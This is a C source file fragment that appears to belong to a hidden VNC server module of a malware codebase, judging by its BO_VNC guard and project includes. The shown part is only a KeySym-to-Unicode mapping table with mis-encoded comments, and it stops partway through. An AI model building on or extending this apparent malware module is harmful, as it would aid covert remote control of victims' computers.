#include <windows.h>
#include <ws2tcpip.h>
#include <wininet.h>

#include "..\defines.h"
#include "..\core.h"

#include "vncserver.h"
#include "defines.h"

#include "..\..\common\debug.h"
#include "..\..\common\gui.h"

#if(BO_VNC > 0)
////////////////////////////////////////////////////////////////////////////////////////////////////
//  ÓÌ‚ÂÚ‡ˆËˇ KeySym -> Unicode.
// Ì‡ ÓÒÌÓ‚Â http://invisible-island.net/xterm/
////////////////////////////////////////////////////////////////////////////////////////////////////

static const struct
{
  WORD keySym;
  WCHAR unicode;
}keySymToUnicodeTable[] =
{
  {0x01a1, 0x0104}, /*                     Aogonek ƒÑ LATIN CAPITAL LETTER A WITH OGONEK */
  {0x01a2, 0x02d8}, /*                       breve Àò BREVE */
  {0x01a3, 0x0141}, /*                     Lstroke ≈Å LATIN CAPITAL LETTER L WITH STROKE */
  {0x01a5, 0x013d}, /*                      Lcaron ƒΩ LATIN CAPITAL LETTER L WITH CARON */
  {0x01a6, 0x015a}, /*                      Sacute ≈ö LATIN CAPITAL LETTER S WITH ACUTE */
  {0x01a9, 0x0160}, /*                      Scaron ≈† LATIN CAPITAL LETTER S WITH CARON */
  {0x01aa, 0x015e}, /*                    Scedilla ≈û LATIN CAPITAL LETTER S WITH CEDILLA */
  {0x01ab, 0x0164}, /*                      Tcaron ≈§ LATIN CAPITAL LETTER T WITH CARON */
  {0x01ac, 0x0179}, /*                      Zacute ≈π LATIN CAPITAL LETTER Z WITH ACUTE */
  {0x01ae, 0x017d}, /*                      Zcaron ≈Ω LATIN CAPITAL LETTER Z WITH CARON */
  {0x01af, 0x017b}, /*                   Zabovedot ≈ª LATIN CAPITAL LETTER Z WITH DOT ABOVE */
  {0x01b1, 0x0105}, /*                     aogonek ƒÖ LATIN SMALL LETTER A WITH OGONEK */
  {0x01b2, 0x02db}, /*                      ogonek Àõ OGONEK */
  {0x01b3, 0x0142}, /*                     lstroke ≈Ç LATIN SMALL LETTER L WITH STROKE */
  {0x01b5, 0x013e}, /*                      lcaron ƒæ LATIN SMALL LETTER L WITH CARON */
  {0x01b6, 0x015b}, /*                      sacute ≈õ LATIN SMALL LETTER S WITH ACUTE */
  {0x01b7, 0x02c7}, /*                       caron Àá CARON */
  {0x01b9, 0x0161}, /*                      scaron ≈° LATIN SMALL LETTER S WITH CARON */
  {0x01ba, 0x015f}, /*                    scedilla ≈ü LATIN SMALL LETTER S WITH CEDILLA */
  {0x01bb, 0x0165}, /*                      tcaron ≈• LATIN SMALL LETTER T WITH CARON */
  {0x01bc, 0x017a}, /*                      zacute ≈∫ LATIN SMALL LETTER Z WITH ACUTE */
  {0x01bd, 0x02dd}, /*                 doubleacute Àù DOUBLE ACUTE ACCENT */
  {0x01be, 0x017e}, /*                      zcaron ≈æ LATIN SMALL LETTER Z WITH CARON */
  {0x01bf, 0x017c}, /*                   zabovedot ≈º LATIN SMALL LETTER Z WITH DOT ABOVE */
  {0x01c0, 0x0154}, /*                      Racute ≈î LATIN CAPITAL LETTER R WITH ACUTE */
  {0x01c3, 0x0102}, /*                      Abreve ƒÇ LATIN CAPITAL LETTER A WITH BREVE */
  {0x01c5, 0x0139}, /*                      Lacute ƒπ LATIN CAPITAL LETTER L WITH ACUTE */
  {0x01c6, 0x0106}, /*                      Cacute ƒÜ LATIN CAPITAL LETTER C WITH ACUTE */
  {0x01c8, 0x010c}, /*                      Ccaron ƒå LATIN CAPITAL LETTER C WITH CARON */
  {0x01ca, 0x0118}, /*                     Eogonek ƒò LATIN CAPITAL LETTER E WITH OGONEK */
  {0x01cc, 0x011a}, /*                      Ecaron ƒö LATIN CAPITAL LETTER E WITH CARON */
  {0x01cf, 0x010e}, /*                      Dcaron ƒé LATIN CAPITAL LETTER D WITH CARON */
  {0x01d0, 0x0110}, /*                     Dstroke ƒê LATIN CAPITAL LETTER D WITH STROKE */
  {0x01d1, 0x0143}, /*                      Nacute ≈É LATIN CAPITAL LETTER N WITH ACUTE */
  {0x01d2, 0x0147}, /*                      Ncaron ≈á LATIN CAPITAL LETTER N WITH CARON */
  {0x01d5, 0x0150}, /*                Odoubleacute ≈ê LATIN CAPITAL LETTER O WITH DOUBLE ACUTE */
  {0x01d8, 0x0158}, /*                      Rcaron ≈ò LATIN CAPITAL LETTER R WITH CARON */
  {0x01d9, 0x016e}, /*                       Uring ≈Æ LATIN CAPITAL LETTER U WITH RING ABOVE */
  {0x01db, 0x0170}, /*                Udoubleacute ≈∞ LATIN CAPITAL LETTER U WITH DOUBLE ACUTE */
  {0x01de, 0x0162}, /*                    Tcedilla ≈¢ LATIN CAPITAL LETTER T WITH CEDILLA */
  {0x01e0, 0x0155}, /*                      racute ≈ï LATIN SMALL LETTER R WITH ACUTE */
  {0x01e3, 0x0103}, /*                      abreve ƒÉ LATIN SMALL LETTER A WITH BREVE */
  {0x01e5, 0x013a}, /*                      lacute ƒ∫ LATIN SMALL LETTER L WITH ACUTE */
  {0x01e6, 0x0107}, /*                      cacute ƒá LATIN SMALL LETTER C WITH ACUTE */
  {0x01e8, 0x010d}, /*                      ccaron ƒç LATIN SMALL LETTER C WITH CARON */
  {0x01ea, 0x0119}, /*                     eogonek ƒô LATIN SMALL LETTER E WITH OGONEK */
  {0x01ec, 0x011b}, /*                      ecaron ƒõ LATIN SMALL LETTER E WITH CARON */
  {0x01ef, 0x010f}, /*                      dcaron ƒè LATIN SMALL LETTER D WITH CARON */
  {0x01f0, 0x0111}, /*                     dstroke ƒë LATIN SMALL LETTER D WITH STROKE */
  {0x01f1, 0x0144}, /*                      nacute ≈Ñ LATIN SMALL LETTER N WITH ACUTE */
  {0x01f2, 0x0148}, /*                      ncaron ≈à LATIN SMALL LETTER N WITH CARON */
  {0x01f5, 0x0151}, /*                odoubleacute ≈ë LATIN SMALL LETTER O WITH DOUBLE ACUTE */
  {0x01f8, 0x0159}, /*                      rcaron ≈ô LATIN SMALL LETTER R WITH CARON */
  {0x01f9, 0x016f}, /*                       uring ≈Ø LATIN SMALL LETTER U WITH RING ABOVE */
  {0x01fb, 0x0171}, /*                udoubleacute ≈± LATIN SMALL LETTER U WITH DOUBLE ACUTE */
  {0x01fe, 0x0163}, /*                    tcedilla ≈£ LATIN SMALL LETTER T WITH CEDILLA */
  {0x01ff, 0x02d9}, /*                    abovedot Àô DOT ABOVE */
  {0x02a1, 0x0126}, /*                     Hstroke ƒ¶ LATIN CAPITAL LETTER H WITH STROKE */
  {0x02a6, 0x0124}, /*                 Hcircumflex ƒ§ LATIN CAPITAL LETTER H WITH CIRCUMFLEX */
  {0x02a9, 0x0130}, /*                   Iabovedot ƒ∞ LATIN CAPITAL LETTER I WITH DOT ABOVE */
  {0x02ab, 0x011e}, /*                      Gbreve ƒû LATIN CAPITAL LETTER G WITH BREVE */
  {0x02ac, 0x0134}, /*                 Jcircumflex ƒ¥ LATIN CAPITAL LETTER J WITH CIRCUMFLEX */
  {0x02b1, 0x0127}, /*                     hstroke ƒß LATIN SMALL LETTER H WITH STROKE */
  {0x02b6, 0x0125}, /*                 hcircumflex ƒ• LATIN SMALL LETTER H WITH CIRCUMFLEX */
  {0x02b9, 0x0131}, /*                    idotless ƒ± LATIN SMALL LETTER DOTLESS I */
  {0x02bb, 0x011f}, /*                      gbreve ƒü LATIN SMALL LETTER G WITH BREVE */
  {0x02bc, 0x0135}, /*                 jcircumflex ƒµ LATIN SMALL LETTER J WITH CIRCUMFLEX */
  {0x02c5, 0x010a}, /*                   Cabovedot ƒä LATIN CAPITAL LETTER C WITH DOT ABOVE */
  {0x02c6, 0x0108}, /*                 Ccircumflex ƒà LATIN CAPITAL LETTER C WITH CIRCUMFLEX */
  {0x02d5, 0x0120}, /*                   Gabovedot ƒ† LATIN CAPITAL LETTER G WITH DOT ABOVE */
  {0x02d8, 0x011c}, /*                 Gcircumflex ƒú LATIN CAPITAL LETTER G WITH CIRCUMFLEX */
  {0x02dd, 0x016c}, /*                      Ubreve ≈¨ LATIN CAPITAL LETTER U WITH BREVE */
  {0x02de, 0x015c}, /*                 Scircumflex ≈ú LATIN CAPITAL LETTER S WITH CIRCUMFLEX */
  {0x02e5, 0x010b}, /*                   cabovedot ƒã LATIN SMALL LETTER C WITH DOT ABOVE */
  {0x02e6, 0x0109}, /*                 ccircumflex ƒâ LATIN SMALL LETTER C WITH CIRCUMFLEX */
  {0x02f5, 0x0121}, /*                   gabovedot ƒ° LATIN SMALL LETTER G WITH DOT ABOVE */
  {0x02f8, 0x011d}, /*                 gcircumflex ƒù LATIN SMALL LETTER G WITH CIRCUMFLEX */
  {0x02fd, 0x016d}, /*                      ubreve ≈≠ LATIN SMALL LETTER U WITH BREVE */
  {0x02fe, 0x015d}, /*                 scircumflex ≈ù LATIN SMALL LETTER S WITH CIRCUMFLEX */
  {0x03a2, 0x0138}, /*                         kra ƒ∏ LATIN SMALL LETTER KRA */
  {0x03a3, 0x0156}, /*                    Rcedilla ≈ñ LATIN CAPITAL LETTER R WITH CEDILLA */
  {0x03a5, 0x0128}, /*                      Itilde ƒ® LATIN CAPITAL LETTER I WITH TILDE */
  {0x03a6, 0x013b}, /*                    Lcedilla ƒª LATIN CAPITAL LETTER L WITH CEDILLA */
  {0x03aa, 0x0112}, /*                     Emacron ƒí LATIN CAPITAL LETTER E WITH MACRON */
  {0x03ab, 0x0122}, /*                    Gcedilla ƒ¢ LATIN CAPITAL LETTER G WITH CEDILLA */
  {0x03ac, 0x0166}, /*                      Tslash ≈¶ LATIN CAPITAL LETTER T WITH STROKE */
  {0x03b3, 0x0157}, /*                    rcedilla ≈ó LATIN SMALL LETTER R WITH CEDILLA */
  {0x03b5, 0x0129}, /*                      itilde ƒ© LATIN SMALL LETTER I WITH TILDE */
  {0x03b6, 0x013c}, /*                    lcedilla ƒº LATIN SMALL LETTER L WITH CEDILLA */
  {0x03ba, 0x0113}, /*                     emacron ƒì LATIN SMALL LETTER E WITH MACRON */
  {0x03bb, 0x0123}, /*                    gcedilla ƒ£ LATIN SMALL LETTER G WITH CEDILLA */
  {0x03bc, 0x0167}, /*                      tslash ≈ß LATIN SMALL LETTER T WITH STROKE */
  {0x03bd, 0x014a}, /*                         ENG ≈ä LATIN CAPITAL LETTER ENG */
  {0x03bf, 0x014b}, /*                         eng ≈ã LATIN SMALL LETTER ENG */
  {0x03c0, 0x0100}, /*                     Amacron ƒÄ LATIN CAPITAL LETTER A WITH MACRON */
  {0x03c7, 0x012e}, /*                     Iogonek ƒÆ LATIN CAPITAL LETTER I WITH OGONEK */
  {0x03cc, 0x0116}, /*                   Eabovedot ƒñ LATIN CAPITAL LETTER E WITH DOT ABOVE */
  {0x03cf, 0x012a}, /*                     Imacron ƒ™ LATIN CAPITAL LETTER I WITH MACRON */
  {0x03d1, 0x0145}, /*                    Ncedilla ≈Ö LATIN CAPITAL LETTER N WITH CEDILLA */
  {0x03d2, 0x014c}, /*                     Omacron ≈å LATIN CAPITAL LETTER O WITH MACRON */
  {0x03d3, 0x0136}, /*                    Kcedilla ƒ∂ LATIN CAPITAL LETTER K WITH CEDILLA */
  {0x03d9, 0x0172}, /*                     Uogonek ≈≤ LATIN CAPITAL LETTER U WITH OGONEK */
  {0x03dd, 0x0168}, /*                      Utilde ≈® LATIN CAPITAL LETTER U WITH TILDE */
  {0x03de, 0x016a}, /*                     Umacron ≈™ LATIN CAPITAL LETTER U WITH MACRON */
  {0x03e0, 0x0101}, /*                     amacron ƒÅ LATIN SMALL LETTER A WITH MACRON */
  {0x03e7, 0x012f}, /*                     iogonek ƒØ LATIN SMALL LETTER I WITH OGONEK */
  {0x03ec, 0x0117}, /*                   eabovedot ƒó LATIN SMALL LETTER E WITH DOT ABOVE */
  {0x03ef, 0x012b}, /*                     imacron ƒ´ LATIN SMALL LETTER I WITH MACRON */
  {0x03f1, 0x0146}, /*                    ncedilla ≈Ü LATIN SMALL LETTER N WITH CEDILLA */
  {0x03f2, 0x014d}, /*                     omacron ≈ç LATIN SMALL LETTER O WITH MACRON */
  {0x03f3, 0x0137}, /*                    kcedilla ƒ∑ LATIN SMALL LETTER K WITH CEDILLA */
  {0x03f9, 0x0173}, /*                     uogonek ≈≥ LATIN SMALL LETTER U WITH OGONEK */
  {0x03fd, 0x0169}, /*                      utilde ≈© LATIN SMALL LETTER U WITH TILDE */
  {0x03fe, 0x016b}, /*                     umacron ≈´ LATIN SMALL LETTER U WITH MACRON */
  {0x047e, 0x203e}, /*                    overline ‚Äæ OVERLINE */
  {0x04a1, 0x3002}, /*               kana_fullstop „ÄÇ IDEOGRAPHIC FULL STOP */
  {0x04a2, 0x300c}, /*         kana_openingbracket „Äå LEFT CORNER BRACKET */
  {0x04a3, 0x300d}, /*         kana_closingbracket „Äç RIGHT CORNER BRACKET */
  {0x04a4, 0x3001}, /*                  kana_comma „ÄÅ IDEOGRAPHIC COMMA */
  {0x04a5, 0x30fb}, /*            kana_conjunctive „Éª KATAKANA MIDDLE DOT */
  {0x04a6, 0x30f2}, /*                     kana_WO „É≤ KATAKANA LETTER WO */
  {0x04a7, 0x30a1}, /*                      kana_a „Ç° KATAKANA LETTER SMALL A */
  {0x04a8, 0x30a3}, /*                      kana_i „Ç£ KATAKANA LETTER SMALL I */
  {0x04a9, 0x30a5}, /*                      kana_u „Ç• KATAKANA LETTER SMALL U */
  {0x04aa, 0x30a7}, /*                      kana_e „Çß KATAKANA LETTER SMALL E */
  {0x04ab, 0x30a9}, /*                      kana_o „Ç© KATAKANA LETTER SMALL O */
  {0x04ac, 0x30e3}, /*                     kana_ya „É£ KATAKANA LETTER SMALL YA */
  {0x04ad, 0x30e5}, /*                     kana_yu „É• KATAKANA LETTER SMALL YU */
  {0x04ae, 0x30e7}, /*                     kana_yo „Éß KATAKANA LETTER SMALL YO */
  {0x04af, 0x30c3}, /*                    kana_tsu „ÉÉ KATAKANA LETTER SMALL TU */
  {0x04b0, 0x30fc}, /*              prolongedsound „Éº KATAKANA-HIRAGANA PROLONGED SOUND MARK */
  {0x04b1, 0x30a2}, /*                      kana_A „Ç¢ KATAKANA LETTER A */
  {0x04b2, 0x30a4}, /*                      kana_I „Ç§ KATAKANA LETTER I */
  {0x04b3, 0x30a6}, /*                      kana_U „Ç¶ KATAKANA LETTER U */
  {0x04b4, 0x30a8}, /*                      kana_E „Ç® KATAKANA LETTER E */
  {0x04b5, 0x30aa}, /*                      kana_O „Ç™ KATAKANA LETTER O */
  {0x04b6, 0x30ab}, /*                     kana_KA „Ç´ KATAKANA LETTER KA */
  {0x04b7, 0x30ad}, /*                     kana_KI „Ç≠ KATAKANA LETTER KI */
  {0x04b8, 0x30af}, /*                     kana_KU „ÇØ KATAKANA LETTER KU */
  {0x04b9, 0x30b1}, /*                     kana_KE „Ç± KATAKANA LETTER KE */
  {0x04ba, 0x30b3}, /*                     kana_KO „Ç≥ KATAKANA LETTER KO */
  {0x04bb, 0x30b5}, /*                     kana_SA „Çµ KATAKANA LETTER SA */
  {0x04bc, 0x30b7}, /*                    kana_SHI „Ç∑ KATAKANA LETTER SI */
  {0x04bd, 0x30b9}, /*                     kana_SU „Çπ KATAKANA LETTER SU */
  {0x04be, 0x30bb}, /*                     kana_SE „Çª KATAKANA LETTER SE */
  {0x04bf, 0x30bd}, /*                     kana_SO „ÇΩ KATAKANA LETTER SO */
  {0x04c0, 0x30bf}, /*                     kana_TA „Çø KATAKANA LETTER TA */
  {0x04c1, 0x30c1}, /*                    kana_CHI „ÉÅ KATAKANA LETTER TI */
  {0x04c2, 0x30c4}, /*                    kana_TSU „ÉÑ KATAKANA LETTER TU */
  {0x04c3, 0x30c6}, /*                     kana_TE „ÉÜ KATAKANA LETTER TE */
  {0x04c4, 0x30c8}, /*                     kana_TO „Éà KATAKANA LETTER TO */
  {0x04c5, 0x30ca}, /*                     kana_NA „Éä KATAKANA LETTER NA */
  {0x04c6, 0x30cb}, /*                     kana_NI „Éã KATAKANA LETTER NI */
  {0x04c7, 0x30cc}, /*                     kana_NU „Éå KATAKANA LETTER NU */
  {0x04c8, 0x30cd}, /*                     kana_NE „Éç KATAKANA LETTER NE */
  {0x04c9, 0x30ce}, /*                     kana_NO „Éé KATAKANA LETTER NO */
  {0x04ca, 0x30cf}, /*                     kana_HA „Éè KATAKANA LETTER HA */
  {0x04cb, 0x30d2}, /*                     kana_HI „Éí KATAKANA LETTER HI */
  {0x04cc, 0x30d5}, /*                     kana_FU „Éï KATAKANA LETTER HU */
  {0x04cd, 0x30d8}, /*                     kana_HE „Éò KATAKANA LETTER HE */
  {0x04ce, 0x30db}, /*                     kana_HO „Éõ KATAKANA LETTER HO */
  {0x04cf, 0x30de}, /*                     kana_MA „Éû KATAKANA LETTER MA */
  {0x04d0, 0x30df}, /*                     kana_MI „Éü KATAKANA LETTER MI */
  {0x04d1, 0x30e0}, /*                     kana_MU „É† KATAKANA LETTER MU */
  {0x04d2, 0x30e1}, /*                     kana_ME „É° KATAKANA LETTER ME */
  {0x04d3, 0x30e2}, /*                     kana_MO „É¢ KATAKANA LETTER MO */
  {0x04d4, 0x30e4}, /*                     kana_YA „É§ KATAKANA LETTER YA */
  {0x04d5, 0x30e6}, /*                     kana_YU „É¶ KATAKANA LETTER YU */
  {0x04d6, 0x30e8}, /*                     kana_YO „É® KATAKANA LETTER YO */
  {0x04d7, 0x30e9}, /*                     kana_RA „É© KATAKANA LETTER RA */
  {0x04d8, 0x30ea}, /*                     kana_RI „É™ KATAKANA LETTER RI */
  {0x04d9, 0x30eb}, /*                     kana_RU „É´ KATAKANA LETTER RU */
  {0x04da, 0x30ec}, /*                     kana_RE „É¨ KATAKANA LETTER RE */
  {0x04db, 0x30ed}, /*                     kana_RO „É≠ KATAKANA LETTER RO */
  {0x04dc, 0x30ef}, /*                     kana_WA „ÉØ KATAKANA LETTER WA */
  {0x04dd, 0x30f3}, /*                      kana_N „É≥ KATAKANA LETTER N */
  {0x04de, 0x309b}, /*                 voicedsound „Çõ KATAKANA-HIRAGANA VOICED SOUND MARK */
  {0x04df, 0x309c}, /*             semivoicedsound „Çú KATAKANA-HIRAGANA SEMI-VOICED SOUND MARK */
  {0x05ac, 0x060c}, /*                Arabic_comma ÿå ARABIC COMMA */
  {0x05bb, 0x061b}, /*            Arabic_semicolon ÿõ ARABIC SEMICOLON */
  {0x05bf, 0x061f}, /*        Arabic_question_mark ÿü ARABIC QUESTION MARK */
  {0x05c1, 0x0621}, /*                Arabic_hamza ÿ° ARABIC LETTER HAMZA */
  {0x05c2, 0x0622}, /*          Arabic_maddaonalef ÿ¢ ARABIC LETTER ALEF WITH MADDA ABOVE */
  {0x05c3, 0x0623}, /*          Arabic_hamzaonalef ÿ£ ARABIC LETTER ALEF WITH HAMZA ABOVE */
  {0x05c4, 0x0624}, /*           Arabic_hamzaonwaw ÿ§ ARABIC LETTER WAW WITH HAMZA ABOVE */
  {0x05c5, 0x0625}, /*       Arabic_hamzaunderalef ÿ• ARABIC LETTER ALEF WITH HAMZA BELOW */
  {0x05c6, 0x0626}, /*           Arabic_hamzaonyeh ÿ¶ ARABIC LETTER YEH WITH HAMZA ABOVE */
  {0x05c7, 0x0627}, /*                 Arabic_alef ÿß ARABIC LETTER ALEF */
  {0x05c8, 0x0628}, /*                  Arabic_beh ÿ® ARABIC LETTER BEH */
  {0x05c9, 0x0629}, /*           Arabic_tehmarbuta ÿ© ARABIC LETTER TEH MARBUTA */
  {0x05ca, 0x062a}, /*                  Arabic_teh ÿ™ ARABIC LETTER TEH */
  {0x05cb, 0x062b}, /*                 Arabic_theh ÿ´ ARABIC LETTER THEH */
  {0x05cc, 0x062c}, /*                 Arabic_jeem ÿ¨ ARABIC LETTER JEEM */
  {0x05cd, 0x062d}, /*                  Arabic_hah ÿ≠ ARABIC LETTER HAH */
  {0x05ce, 0x062e}, /*                 Arabic_khah ÿÆ ARABIC LETTER KHAH */
  {0x05cf, 0x062f}, /*                  Arabic_dal ÿØ ARABIC LETTER DAL */
  {0x05d0, 0x0630}, /*                 Arabic_thal ÿ∞ ARABIC LETTER THAL */
  {0x05d1, 0x0631}, /*                   Arabic_ra ÿ± ARABIC LETTER REH */
  {0x05d2, 0x0632}, /*                 Arabic_zain ÿ≤ ARABIC LETTER ZAIN */
  {0x05d3, 0x0633}, /*                 Arabic_seen ÿ≥ ARABIC LETTER SEEN */
  {0x05d4, 0x0634}, /*                Arabic_sheen ÿ¥ ARABIC LETTER SHEEN */
  {0x05d5, 0x0635}, /*                  Arabic_sad ÿµ ARABIC LETTER SAD */
  {0x05d6, 0x0636}, /*                  Arabic_dad ÿ∂ ARABIC LETTER DAD */
  {0x05d7, 0x0637}, /*                  Arabic_tah ÿ∑ ARABIC LETTER TAH */
  {0x05d8, 0x0638}, /*                  Arabic_zah ÿ∏ ARABIC LETTER ZAH */
  {0x05d9, 0x0639}, /*                  Arabic_ain ÿπ ARABIC LETTER AIN */
  {0x05da, 0x063a}, /*                Arabic_ghain ÿ∫ ARABIC LETTER GHAIN */
  {0x05e0, 0x0640}, /*              Arabic_tatweel ŸÄ ARABIC TATWEEL */
  {0x05e1, 0x0641}, /*                  Arabic_feh ŸÅ ARABIC LETTER FEH */
  {0x05e2, 0x0642}, /*                  Arabic_qaf ŸÇ ARABIC LETTER QAF */
  {0x05e3, 0x0643}, /*                  Arabic_kaf ŸÉ ARABIC LETTER KAF */
  {0x05e4, 0x0644}, /*                  Arabic_lam ŸÑ ARABIC LETTER LAM */
  {0x05e5, 0x0645}, /*                 Arabic_meem ŸÖ ARABIC LETTER MEEM */
  {0x05e6, 0x0646}, /*                 Arabic_noon ŸÜ ARABIC LETTER NOON */
  {0x05e7, 0x0647}, /*                   Arabic_ha Ÿá ARABIC LETTER HEH */
  {0x05e8, 0x0648}, /*                  Arabic_waw Ÿà ARABIC LETTER WAW */
  {0x05e9, 0x0649}, /*          Arabic_alefmaksura Ÿâ ARABIC LETTER ALEF MAKSURA */
  {0x05ea, 0x064a}, /*                  Arabic_yeh Ÿä ARABIC LETTER YEH */
  {0x05eb, 0x064b}, /*             Arabic_fathatan Ÿã ARABIC FATHATAN */
  {0x05ec, 0x064c}, /*             Arabic_dammatan Ÿå ARABIC DAMMATAN */
  {0x05ed, 0x064d}, /*             Arabic_kasratan Ÿç ARABIC KASRATAN */
  {0x05ee, 0x064e}, /*                Arabic_fatha Ÿé ARABIC FATHA */
  {0x05ef, 0x064f}, /*                Arabic_damma Ÿè ARABIC DAMMA */
  {0x05f0, 0x0650}, /*                Arabic_kasra Ÿê ARABIC KASRA */
  {0x05f1, 0x0651}, /*               Arabic_shadda Ÿë ARABIC SHADDA */
  {0x05f2, 0x0652}, /*                Arabic_sukun Ÿí ARABIC SUKUN */
  {0x06a1, 0x0452}, /*                 Serbian_dje —í CYRILLIC SMALL LETTER DJE */
  {0x06a2, 0x0453}, /*               Macedonia_gje —ì CYRILLIC SMALL LETTER GJE */
  {0x06a3, 0x0451}, /*                 Cyrillic_io —ë CYRILLIC SMALL LETTER IO */
  {0x06a4, 0x0454}, /*                Ukrainian_ie —î CYRILLIC SMALL LETTER UKRAINIAN IE */
  {0x06a5, 0x0455}, /*               Macedonia_dse —ï CYRILLIC SMALL LETTER DZE */
  {0x06a6, 0x0456}, /*                 Ukrainian_i —ñ CYRILLIC SMALL LETTER BYELORUSSIAN-UKRAINIAN I */
  {0x06a7, 0x0457}, /*                Ukrainian_yi —ó CYRILLIC SMALL LETTER YI */
  {0x06a8, 0x0458}, /*                 Cyrillic_je —ò CYRILLIC SMALL LETTER JE */
  {0x06a9, 0x0459}, /*                Cyrillic_lje —ô CYRILLIC SMALL LETTER LJE */
  {0x06aa, 0x045a}, /*                Cyrillic_nje —ö CYRILLIC SMALL LETTER NJE */
  {0x06ab, 0x045b}, /*                Serbian_tshe —õ CYRILLIC SMALL LETTER TSHE */
  {0x06ac, 0x045c}, /*               Macedonia_kje —ú CYRILLIC SMALL LETTER KJE */
  {0x06ad, 0x0491}, /*   Ukrainian_ghe_with_upturn “ë CYRILLIC SMALL LETTER GHE WITH UPTURN */
  {0x06ae, 0x045e}, /*         Byelorussian_shortu —û CYRILLIC SMALL LETTER SHORT U */
  {0x06af, 0x045f}, /*               Cyrillic_dzhe —ü CYRILLIC SMALL LETTER DZHE */
  {0x06b0, 0x2116}, /*                  numerosign ‚Ññ NUMERO SIGN */
  {0x06b1, 0x0402}, /*                 Serbian_DJE –Ç CYRILLIC CAPITAL LETTER DJE */
  {0x06b2, 0x0403}, /*               Macedonia_GJE –É CYRILLIC CAPITAL LETTER GJE */
  {0x06b3, 0x0401}, /*                 Cyrillic_IO –Å CYRILLIC CAPITAL LETTER IO */
  {0x06b4, 0x0404}, /*                Ukrainian_IE –Ñ CYRILLIC CAPITAL LETTER UKRAINIAN IE */
  {0x06b5, 0x0405}, /*               Macedonia_DSE –Ö CYRILLIC CAPITAL LETTER DZE */
  {0x06b6, 0x0406}, /*                 Ukrainian_I –Ü CYRILLIC CAPITAL LETTER BYELORUSSIAN-UKRAINIAN I */
  {0x06b7, 0x0407}, /*                Ukrainian_YI –á CYRILLIC CAPITAL LETTER YI */
  {0x06b8, 0x0408}, /*                 Cyrillic_JE –à CYRILLIC CAPITAL LETTER JE */
  {0x06b9, 0x0409}, /*                Cyrillic_LJE –â CYRILLIC CAPITAL LETTER LJE */
  {0x06ba, 0x040a}, /*                Cyrillic_NJE –ä CYRILLIC CAPITAL LETTER NJE */
  {0x06bb, 0x040b}, /*                Serbian_TSHE –ã CYRILLIC CAPITAL LETTER TSHE */
  {0x06bc, 0x040c}, /*               Macedonia_KJE –å CYRILLIC CAPITAL LETTER KJE */
  {0x06bd, 0x0490}, /*   Ukrainian_GHE_WITH_UPTURN “ê CYRILLIC CAPITAL LETTER GHE WITH UPTURN */
  {0x06be, 0x040e}, /*         Byelorussian_SHORTU –é CYRILLIC CAPITAL LETTER SHORT U */
  {0x06bf, 0x040f}, /*               Cyrillic_DZHE –è CYRILLIC CAPITAL LETTER DZHE */
  {0x06c0, 0x044e}, /*                 Cyrillic_yu —é CYRILLIC SMALL LETTER YU */
  {0x06c1, 0x0430}, /*                  Cyrillic_a –∞ CYRILLIC SMALL LETTER A */
  {0x06c2, 0x0431}, /*                 Cyrillic_be –± CYRILLIC SMALL LETTER BE */
  {0x06c3, 0x0446}, /*                Cyrillic_tse —Ü CYRILLIC SMALL LETTER TSE */
  {0x06c4, 0x0434}, /*                 Cyrillic_de –¥ CYRILLIC SMALL LETTER DE */
  {0x06c5, 0x0435}, /*                 Cyrillic_ie –µ CYRILLIC SMALL LETTER IE */
  {0x06c6, 0x0444}, /*                 Cyrillic_ef —Ñ CYRILLIC SMALL LETTER EF */
  {0x06c7, 0x0433}, /*                Cyrillic_ghe –≥ CYRILLIC SMALL LETTER GHE */
  {0x06c8, 0x0445}, /*                 Cyrillic_ha —Ö CYRILLIC SMALL LETTER HA */
  {0x06c9, 0x0438}, /*                  Cyrillic_i –∏ CYRILLIC SMALL LETTER I */
  {0x06ca, 0x0439}, /*             Cyrillic_shorti –π CYRILLIC SMALL LETTER SHORT I */
  {0x06cb, 0x043a}, /*                 Cyrillic_ka –∫ CYRILLIC SMALL LETTER KA */
  {0x06cc, 0x043b}, /*                 Cyrillic_el –ª CYRILLIC SMALL LETTER EL */
  {0x06cd, 0x043c}, /*                 Cyrillic_em –º CYRILLIC SMALL LETTER EM */
  {0x06ce, 0x043d}, /*                 Cyrillic_en –Ω CYRILLIC SMALL LETTER EN */
  {0x06cf, 0x043e}, /*                  Cyrillic_o –æ CYRILLIC SMALL LETTER O */
  {0x06d0, 0x043f}, /*                 Cyrillic_pe –ø CYRILLIC SMALL LETTER PE */
  {0x06d1, 0x044f}, /*                 Cyrillic_ya —è CYRILLIC SMALL LETTER YA */
  {0x06d2, 0x0440}, /*                 Cyrillic_er —Ä CYRILLIC SMALL LETTER ER */
  {0x06d3, 0x0441}, /*                 Cyrillic_es —Å CYRILLIC SMALL LETTER ES */
  {0x06d4, 0x0442}, /*                 Cyrillic_te —Ç CYRILLIC SMALL LETTER TE */
  {0x06d5, 0x0443}, /*                  Cyrillic_u —É CYRILLIC SMALL LETTER U */
  {0x06d6, 0x0436}, /*                Cyrillic_zhe –∂ CYRILLIC SMALL LETTER ZHE */
  {0x06d7, 0x0432}, /*                 Cyrillic_ve –≤ CYRILLIC SMALL LETTER VE */
  {0x06d8, 0x044c}, /*           Cyrillic_softsign —å CYRILLIC SMALL LETTER SOFT SIGN */
  {0x06d9, 0x044b}, /*               Cyrillic_yeru —ã CYRILLIC SMALL LETTER YERU */
  {0x06da, 0x0437}, /*                 Cyrillic_ze –∑ CYRILLIC SMALL LETTER ZE */
  {0x06db, 0x0448}, /*                Cyrillic_sha —à CYRILLIC SMALL LETTER SHA */
  {0x06dc, 0x044d}, /*                  Cyrillic_e —ç CYRILLIC SMALL LETTER E */
  {0x06dd, 0x0449}, /*              Cyrillic_shcha —â CYRILLIC SMALL LETTER SHCHA */
  {0x06de, 0x0447}, /*                Cyrillic_che —á CYRILLIC SMALL LETTER CHE */
  {0x06df, 0x044a}, /*           Cyrillic_hardsign —ä CYRILLIC SMALL LETTER HARD SIGN */
  {0x06e0, 0x042e}, /*                 Cyrillic_YU –Æ CYRILLIC CAPITAL LETTER YU */
  {0x06e1, 0x0410}, /*                  Cyrillic_A –ê CYRILLIC CAPITAL LETTER A */
  {0x06e2, 0x0411}, /*                 Cyrillic_BE –ë CYRILLIC CAPITAL LETTER BE */
  {0x06e3, 0x0426}, /*                Cyrillic_TSE –¶ CYRILLIC CAPITAL LETTER TSE */
  {0x06e4, 0x0414}, /*                 Cyrillic_DE –î CYRILLIC CAPITAL LETTER DE */
  {0x06e5, 0x0415}, /*                 Cyrillic_IE –ï CYRILLIC CAPITAL LETTER IE */
